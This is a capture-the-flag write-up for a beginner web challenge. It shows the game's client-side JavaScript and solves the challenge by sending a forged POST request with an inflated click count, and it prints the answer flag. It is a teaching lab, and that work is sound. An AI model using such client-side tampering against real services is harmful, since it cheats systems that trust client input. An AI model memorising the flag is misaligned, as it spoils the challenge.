---
title: "Beginner: Off-Brand Cookie Clicker"
description: "I tried to make my own version of cookie clicker, without all of the extra fluff."
points: 100
solves: 474
date: April 1 2024
author: xHyroM
---

As soon as we open the site, we notice that we have to beat a certain score, and when we click on the cookie, it increases.

![cookie clicker](https://raw.githubusercontent.com/GerlachSnezka/utctf/main/assets/2024-web-cookie-clicker.png)

We can start by inspecting the website using dev tools and we'll find this piece of code:
```js
document.addEventListener('DOMContentLoaded', function() {
  var count = parseInt(localStorage.getItem('count')) || 0;
  var cookieImage = document.getElementById('cookieImage');
  var display = document.getElementById('clickCount');

  display.textContent = count;

  cookieImage.addEventListener('click', function() {
    count++;
    display.textContent = count;
    localStorage.setItem('count', count);

    if (count >= 10000000) {
        fetch('/click', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'count=' + count
        })
        .then(response => response.json())
        .then(data => {
            alert(data.flag);
        });
    }
  });
});
```

![cookie clicker code](https://raw.githubusercontent.com/GerlachSnezka/utctf/main/assets/2024-web-cookie-clicker-src.png)

We see here the condition that if the count is greater than `10000000` then a POST request is made to `/click`

So all we have to do is take a piece of code, modify `count` and run it:
```js
fetch('/click', {
  method: 'POST',
  headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'count=10000001'
})
.then(response => response.json())
.then(data => {
  alert(data.flag);
});
```

Flag:
```
utflag{y0u_cl1ck_pr3tty_f4st}
```